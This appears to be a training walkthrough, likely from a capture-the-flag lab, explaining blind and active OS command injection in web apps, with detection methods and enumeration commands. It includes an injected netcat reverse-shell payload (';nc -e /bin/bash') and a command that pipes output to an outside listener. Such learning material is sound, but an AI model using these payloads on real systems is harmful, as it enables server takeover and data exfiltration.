#What is OS Command Injection?﻿

```
Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.  Sometimes this won't always end in something malicious, like a whoami or just reading of files.  That isn't too bad.  But the thing about command injection is it opens up many options for the attacker.  The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as.  A simple ;nc -e /bin/bash is all that's needed and they own your server.

Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around.  Now that we know what command injection is, we'll start going into the different types and how to test for them.
```

#Blind Command Injection

```
What is Blind Command Injection?

Blind command injection occurs when the system call that's being made does not return the response of the call to the Document Object Model (or DOM).  The DOM is where the HTML is rendered.  This walkthrough isn't about web development so for the purposes of this room, you can consider the DOM the canvas of an HTML document.

Sometimes the user inputs a test command to try to see if the server is vulnerable to command injection, the command is executed by the server-side code on the server and the code doesn't output the response.  For example, let's look at the code for the Directory Search application that Evil Corp developed.  It's very poorly written and is vulnerable to blind command injection.  See if you can figure out why before continuing on.  I'll explain it below.

```

#Ways to Detect Blind Command Injection

```
As I mentioned above, blind command injection occurs when the response of the HTTP request is not returned to the DOM.  You can see in the above code that the response is never returned anywhere on the page.  The only thing that gets returned is an alert that says whether a user was found on the system or not.  For the purposes of this room, I made the alert tell you what was going on, but sometimes it won't be that easy.  So here are a few ways to tell whether you have blind command injection or not.

Ping!

Yes, your friend ping can help you tell whether you have blind command injection or not.  Since the code is making a system call in some way, a ping will cause the page to continue loading until the command has completed.  So if you send a ping with 10 ICMP packets, the page should be loading for about 10 seconds.  If you send 20(!) packets, it should take about 20 seconds, and so on.

Redirection of Output

Ping is usually enough to tell you whether you have blind command injection, but if you want to test further, you can attempt to redirect the output of a command to a file, then, using the browser, navigate to the page where the file is stored.  We all know the > Bash operator redirects output to a file or process so you could try redirecting the output of id, whoami, netstat, ip addr or other useful command to see if you can see the results.

Bypassing the Blind Injection with Netcat

In the spirit of full disclosure, there is a way to bypass the blind injection with netcat.  You are able to pipe the output of a command to a nc listener.  You could do something like root; ls -la | nc {VPN_IP} {PORT} . This will send the output of ls -la to your netcat listener.
```

#Active Command Injection

```
What is Active Command Injection?

As mentioned in the previous task, blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.  Active command injection will return the response to the user.  It can be made visible through several HTML elements. 

EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet.  It's nowhere near finished but contains the same command injection vulnerability as before!  But this time, the response from the system call can be seen on the page!  They'll never learn!
```

#Ways to Detect Active Command Injection

```
We know that active command injection occurs when you can see the response from the system call.  In the above code, the function passthru() is actually what's doing all of the work here.  It's passing the response directly to the document so you can see the fruits of your labor right there.  Since we know that, we can go over some useful commands to try to enumerate the machine a bit further.  The function call here to passthru() may not always be what's happening behind the scenes, but I felt it was the easiest and least complicated way to demonstrate the vulnerability.  

Commands to try

Linux

    whoami
    id
    ifconfig/ip addr
    uname -a
    ps -ef

Windows

    whoami
    ver
    ipconfig
    tasklist
    netstat -an
```

